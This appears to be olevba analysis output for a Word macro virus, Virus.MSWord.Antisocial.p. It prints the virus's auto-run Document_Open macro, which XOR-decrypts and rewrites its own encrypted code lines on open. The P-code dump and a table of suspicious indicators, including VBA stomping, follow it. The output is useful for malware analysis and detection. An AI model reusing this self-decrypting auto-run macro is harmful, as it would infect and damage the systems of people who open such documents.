olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
For V1 = 16 To 34
V2 = Null
V3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Asc((Mid(V3, 2, 1))) Xor Asc((Mid(V3, 3, 1)))
For V5 = 5 To Len(V3) Step 2
V6 = Asc(Mid(V3, V5, 1)) Xor V4
V2 = V2 & Chr(V6)
Next
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V2
Next
Demo
End Sub
Private Function Demo()
'½¸¡Jakd%Ì@$wÉwÕj¾w+%|Wà`Ðvspöhâ`-%óKq`•}Ëq,
'¤ cB«k°v[$_EÙ$Ø9£$û5ë2S$»PúkW$—780þ
'·¶ C7!7<Ò!`B+ibsu)cHóoúuz)^)DSEo°e|!|+¿!i3­3O3J(¢!2*†!ê2[2Ï(u(a
'íë¬E€&6;�&»Dë&Ú &&™.ìR€n·o�u“B‡ioezs\k-cWhúr.(wPrD�VCtŠiZl¬c™eCrñ(²P‘DwE8iÏk‡vÈi¥hÙc%hOr1u8(jO=r!c˜k².™7Ø/3(KE·i…bpcBK½iïb–s4jÉcz(‡JŽoOhjc6u£.FGî*6&ƒ7]/â/Ç
'][YB4&';h&ÐObhUr‹.YTlh*bŒ.N/à&£,È&î>j/™&2-­&|7ö
':2ªNngBz‹(QMý(=5'(m9š(í\˜g{(ÝDØm¶fÁ þKl!Ž
'|zH@~&™;Õ&™Gu’eS.ªK�o¸bå.sEd*b&BC–*R&¢7q/ã/‹&K^¸iÆt©&ÎBD
'ÔÖõ@/".?Ñ"u@‡";$:"GA+j¿p—*�DQ+ˆ"Æ$È"yAéjÆp4*­K¿l$v€*z*^PûlÓf»"}(Ä"^0p0�0ò+;"°)n"81J12+�+õ
'™�øJQau|xp_$�A?
'“›œ\ê`²a‚{ºL/gÈk¼}�eCmRfi|Ï&,^“JÉXÒzigøbÓm¶ké|ã&}^<JôKÒg»ezx$gFfEm’f{|8{^&¯AÝ|�mJeè s9h!Ì&QK„gUläm¨Etgwlà}£dïm“&jZámZxZdHink!mÅDÛa^f½mz(ÕIÅ$‚(2*|/l*¾(f.Ò(BJ¤
'õ÷ñL:gûz­v¥"éC 
'WP1H‚wÉsWnuhyi•t])¢QOn2uçr9t±WèuThósÜb‚dŽsËnÚhuiL'i:|'BAªf7kNtºb�
'IA‰G!x|aaÈgæf×{H&9[#iB~tmJFúgâz¢eÂiAdZX'zØgÎeÐxj|…(œ5Ó(žNNiOdq{ mm
'–’ K,tšpNmökðjýwÛ*{GÓküjZbGm»v$ilGºk9j9raayv�wfmbkÔjewt$z9Û${BÁe³h{wóa°
'“‘¢VÇF†"é?_"µVæj_krq$FbmûaÊw¡o§g\l‘vÑ,ßT5@™R}p1m…h¼g�a{vò,ûT¤@—A©m4oIr_m%lBg~lšvœqÎ,*K{v.gfo¦*“3¥+j,êAËm f€gÃOEm.fWwÉnôgm,¸NÐk(lÑgŒqN*¦3ê.ò"²V$j³k÷q#Fôm1abw¢oÔg)l-vž,fT|@’RÃp…mhh1g{a vÊ,¡T±@ÔA}mÑoÁrºmÃlKgÌl0vXqó,×KQvIgUoî*Z3Y+¿,´AÌmÉfegØOÀmçfRwpn›go,NA¡m¬w?l.v­MÛd¯NkJlŽgùqË+u
'Œ‰¶L)c°%èQlm;lvÌApj|fÆp�hÀ`‘kGq^%48ú%_DªfeqÞlgsÑ`GAcj1fŽp…h¥`'kgq?%iQÉm¬`ökØ%›V§`Kqé%gQ¦d¥wËb¿`¹qÉ%Z8›%’Kžj_w}hndøi”Q¢`ˆh(uti?d²qC`L%t@6i©v¼`‚%~Vk`¼qP%*Qåd*w†bÅ`Èq×%O8‰%áDØf|q‡lnsX`ÔA™j˜f¬p4h¾`Zk-q^
'öõ°WqbsqidPfPw~-ªUVA¹S£q¦l2i*fC`Wwy-¢U`AÚ@èl•nws!lXmEf°múwfpV-äJ=wŸf§n¨+»2Ý*6-x@×l\g·fxNÚl�gÚvQoÃfè-QGûf÷oâf•w±f†OCj¯m©fÞpr#,2‘/-#tW…bcq÷d#f±w©-—U'AÀSfqúlaiqfh`owU-¤U¼A\@ l¡nüsïlXmÔfËm{w¬pŽ-�J>wøfHn£+¸29*±-Ä@Îl€g3f�N l.g|v;oAff-ü@§l^v}m‰w/L†e‚Oòj]mGf‘pm
'’–ZP/e¯vqcšaäp~*¤RuF-T9vAkAnÉa[g?p**ºRÜF“GÒkûi•t0k«jja^j¸pzwv*NMãpBazi¨,š5Â-<*iG"kÎ`íacISkô`Jq}hqai*úE¡`•`>Bèv'kÐiÀWWpòvˆmÁjycT$¦P›@‡
'±¶/FCd7s,nšqõbSCmhæd‹rTjÝb0i>s÷)ÚT×fþqVb´F«tø'~A-nãkEbXI§frj–bì=š:öFÊdzsÈn qƒb+C)hqd}rrj­bHi�sC)øA]r.kÓk¾IXfÐjâbû
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Antisocial.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 138154 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	LitDI2 0x0010 
' 	LitDI2 0x0022 
' 	For 
' Line #3:
' 	LitVarSpecial (Null)
' 	St V2 
' Line #4:
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St V3 
' Line #5:
' 	Ld V3 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	ArgsLd Asc 0x0001 
' 	Ld V3 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	ArgsLd Asc 0x0001 
' 	Xor 
' 	St V4 
' Line #6:
' 	StartForVariable 
' 	Ld V5 
' 	EndForVariable 
' 	LitDI2 0x0005 
' 	Ld V3 
' 	FnLen 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #7:
' 	Ld V3 
' 	Ld V5 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld V4 
' 	Xor 
' 	St V6 
' Line #8:
' 	Ld V2 
' 	Ld V6 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St V2 
' Line #9:
' 	StartForVariable 
' 	Next 
' Line #10:
' 	Ld V1 
' 	Ld V2 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' 	ArgsCall Demo 0x0000 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Function Demo(id_FFFE As Variant))
' Line #15:
' 	QuoteRem 0x0000 0x002B "½¸¡Jakd%Ì@$wÉwÕj¾w+%|Wà`Ðvspöhâ`-%óKq`•}Ëq,"
' Line #16:
' 	QuoteRem 0x0000 0x0023 "¤ cB«k°v[$_EÙ$Ø9£$û5ë2S$»PúkW$—780þ"
' Line #17:
' 	QuoteRem 0x0000 0x003F "·¶ C7!7<Ò!`B+ibsu)cHóoúuz)^)DSEo°e|!|+¿!i3­3O3J(¢!2*†!ê2[2Ï(u(a"
' Line #18:
' 	QuoteRem 0x0000 0x009B "íë¬E€&6;�&»Dë&Ú &&™.ìR€n·o�u“B‡ioezs\k-cWhúr.(wPrD�VCtŠiZl¬c™eCrñ(²P‘DwE8iÏk‡vÈi¥hÙc%hOr1u8(jO=r!c˜k².™7Ø/3(KE·i…bpcBK½iïb–s4jÉcz(‡JŽoOhjc6u£.FGî*6&ƒ7]/â/Ç"
' Line #19:
' 	QuoteRem 0x0000 0x002F "][YB4&';h&ÐObhUr‹.YTlh*bŒ.N/à&£,È&î>j/™&2-­&|7ö"
' Line #20:
' 	QuoteRem 0x0000 0x0029 ":2ªNngBz‹(QMý(=5'(m9š(í\˜g{(ÝDØm¶fÁ þKl!Ž"
' Line #21:
' 	QuoteRem 0x0000 0x0039 "|zH@~&™;Õ&™Gu’eS.ªK�o¸bå.sEd*b&BC–*R&¢7q/ã/‹&K^¸iÆt©&ÎBD"
' Line #22:
' 	QuoteRem 0x0000 0x0059 "ÔÖõ@/".?Ñ"u@‡";$:"GA+j¿p—*�DQ+ˆ"Æ$È"yAéjÆp4*­K¿l$v€*z*^PûlÓf»"}(Ä"^0p0�0ò+;"°)n"81J12+�+õ"
' Line #23:
' 	QuoteRem 0x0000 0x000F "™�øJQau|xp_$�A?"
' Line #24:
' 	QuoteRem 0x0000 0x009D "“›œ\ê`²a‚{ºL/gÈk¼}�eCmRfi|Ï&,^“JÉXÒzigøbÓm¶ké|ã&}^<JôKÒg»ezx$gFfEm’f{|8{^&¯AÝ|�mJeè s9h!Ì&QK„gUläm¨Etgwlà}£dïm“&jZámZxZdHink!mÅDÛa^f½mz(ÕIÅ$‚(2*|/l*¾(f.Ò(BJ¤"
' Line #25:
' 	QuoteRem 0x0000 0x000F "õ÷ñL:gûz­v¥"éC "
' Line #26:
' 	QuoteRem 0x0000 0x0041 "WP1H‚wÉsWnuhyi•t])¢QOn2uçr9t±WèuThósÜb‚dŽsËnÚhuiL'i:|'BAªf7kNtºb�"
' Line #27:
' 	QuoteRem 0x0000 0x0043 "IA‰G!x|aaÈgæf×{H&9[#iB~tmJFúgâz¢eÂiAdZX'zØgÎeÐxj|…(œ5Ó(žNNiOdq{ mm"
' Line #28:
' 	QuoteRem 0x0000 0x0047 "–’ K,tšpNmökðjýwÛ*{GÓküjZbGm»v$ilGºk9j9raayv�wfmbkÔjewt$z9Û${BÁe³h{wóa°"
' Line #29:
' 	QuoteRem 0x0000 0x0115 "“‘¢VÇF†"é?_"µVæj_krq$FbmûaÊw¡o§g\l‘vÑ,ßT5@™R}p1m…h¼g�a{vò,ûT¤@—A©m4oIr_m%lBg~lšvœqÎ,*K{v.gfo¦*“3¥+j,êAËm f€gÃOEm.fWwÉnôgm,¸NÐk(lÑgŒqN*¦3ê.ò"²V$j³k÷q#Fôm1abw¢oÔg)l-vž,fT|@’RÃp…mhh1g{a vÊ,¡T±@ÔA}mÑoÁrºmÃlKgÌl0vXqó,×KQvIgUoî*Z3Y+¿,´AÌmÉfegØOÀmçfRwpn›go,NA¡m¬w?l.v­MÛd¯NkJlŽgùqË+u"
' Line #30:
' 	QuoteRem 0x0000 0x00C7 "Œ‰¶L)c°%èQlm;lvÌApj|fÆp�hÀ`‘kGq^%48ú%_DªfeqÞlgsÑ`GAcj1fŽp…h¥`'kgq?%iQÉm¬`ökØ%›V§`Kqé%gQ¦d¥wËb¿`¹qÉ%Z8›%’Kžj_w}hndøi”Q¢`ˆh(uti?d²qC`L%t@6i©v¼`‚%~Vk`¼qP%*Qåd*w†bÅ`Èq×%O8‰%áDØf|q‡lnsX`ÔA™j˜f¬p4h¾`Zk-q^"
' Line #31:
' 	QuoteRem 0x0000 0x00FD "öõ°WqbsqidPfPw~-ªUVA¹S£q¦l2i*fC`Wwy-¢U`AÚ@èl•nws!lXmEf°múwfpV-äJ=wŸf§n¨+»2Ý*6-x@×l\g·fxNÚl�gÚvQoÃfè-QGûf÷oâf•w±f†OCj¯m©fÞpr#,2‘/-#tW…bcq÷d#f±w©-—U'AÀSfqúlaiqfh`owU-¤U¼A\@ l¡nüsïlXmÔfËm{w¬pŽ-�J>wøfHn£+¸29*±-Ä@Îl€g3f�N l.g|v;oAff-ü@§l^v}m‰w/L†e‚Oòj]mGf‘pm"
' Line #32:
' 	QuoteRem 0x0000 0x0085 "’–ZP/e¯vqcšaäp~*¤RuF-T9vAkAnÉa[g?p**ºRÜF“GÒkûi•t0k«jja^j¸pzwv*NMãpBazi¨,š5Â-<*iG"kÎ`íacISkô`Jq}hqai*úE¡`•`>Bèv'kÐiÀWWpòvˆmÁjycT$¦P›@‡"
' Line #33:
' 	QuoteRem 0x0000 0x0071 "±¶/FCd7s,nšqõbSCmhæd‹rTjÝb0i>s÷)ÚT×fþqVb´F«tø'~A-nãkEbXI§frj–bì=š:öFÊdzsÈn qƒb+C)hqd}rrj­bHi�sC)øA]r.kÓk¾IXfÐjâbû"
' Line #34:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

